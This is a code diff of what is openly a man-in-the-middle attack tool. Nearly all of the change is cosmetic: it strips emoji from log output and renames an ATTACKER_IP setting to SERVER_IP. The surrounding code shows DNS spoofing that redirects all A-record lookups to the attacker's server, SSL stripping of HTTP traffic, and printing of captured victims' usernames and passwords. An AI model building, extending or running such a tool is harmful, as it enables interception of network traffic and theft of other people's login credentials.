@@ -102,7 +102,7 @@ class SSLStripAnalyzer:
             'type': 'HTTP→HTTPS Bridge'
         }
         self.https_upgrades.append(entry)
-        print(f"\n[Analyzer] ⚠ CRITICAL: HTTP→HTTPS BRIDGE DETECTED!")
+        print(f"\n[Analyzer] CRITICAL: HTTP→HTTPS BRIDGE DETECTED!")
         print(f"[Analyzer]   From: {from_url}")
         print(f"[Analyzer]   To: {to_url}")
         print(f"[Analyzer]   Status: {status_code}\n")
@@ -187,8 +187,8 @@ class SSLStripAnalyzer:
         if captured_credentials:
             for cred in captured_credentials:
                 print(f"   • {cred['timestamp']} - {cred['host']}")
-                print(f"     👤 Username: {cred.get('username', 'N/A')}")
-                print(f"     🔑 Password: {cred.get('password', 'N/A')}")
+                print(f"     Username: {cred.get('username', 'N/A')}")
+                print(f"     Password: {cred.get('password', 'N/A')}")
         else:
             print(f"   • No credentials captured")
         
@@ -343,9 +343,9 @@ def dns_handler(packet):
     spoof_ip = None
     
     if CONFIG["MODE"] == "ALL_OUT" and packet[DNSQR].qtype == 1:
-        # ALL_OUT: Spoof ALL A record queries, redirect to attacker
+        # ALL_OUT: Spoof ALL A record queries, redirect to attacker server
         should_spoof = True
-        spoof_ip = CONFIG["ATTACKER_IP"]
+        spoof_ip = CONFIG["SERVER_IP"]
     elif CONFIG["MODE"] == "SILENT" and query_name in SPOOF_MAP:
         # SILENT: Only spoof domains in our target list
         should_spoof = True
@@ -449,7 +449,7 @@ class SSLStripHandler(BaseHTTPRequestHandler):
     def do_CONNECT(self):
         host = self.path.split(':')[0]
         analyzer.log_direct_https(host)
-        print(f"[SSL Strip] ✗ CONNECT {host} - HSTS protected")
+        print(f"[SSL Strip] CONNECT {host} - HSTS protected")
         self.send_error(502, "HSTS protected")
     
     # Main request handler for GET, POST, HEAD
@@ -540,7 +540,7 @@ class SSLStripHandler(BaseHTTPRequestHandler):
             if method != 'HEAD':
                 self.wfile.write(response_data)
             
-            print(f"[SSL Strip] ✓ Sent {len(response_data)} bytes")
+            print(f"[SSL Strip] Sent {len(response_data)} bytes")
             
         except Exception as e:
             print(f"[SSL Strip] Error: {e}")
